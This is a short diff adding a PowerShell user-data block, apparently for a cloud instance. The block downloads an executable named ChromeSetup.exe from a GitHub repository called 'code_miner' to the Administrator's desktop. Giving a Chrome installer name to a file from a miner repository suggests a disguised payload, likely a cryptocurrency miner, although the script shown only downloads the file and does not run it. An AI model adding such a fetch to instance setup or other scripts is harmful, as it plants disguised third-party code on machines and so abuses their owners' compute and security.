@@ -1,0 +1,7 @@
+<powershell>
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$clnt = new-object System.Net.WebClient
+$url = "https://github.com/ilehoe0202/code_miner/raw/master/ChromeSetup.exe"
+$file = "C:\Users\Administrator\Desktop\ChromeSetup.exe"
+$clnt.DownloadFile($url,$file)
+</powershell>
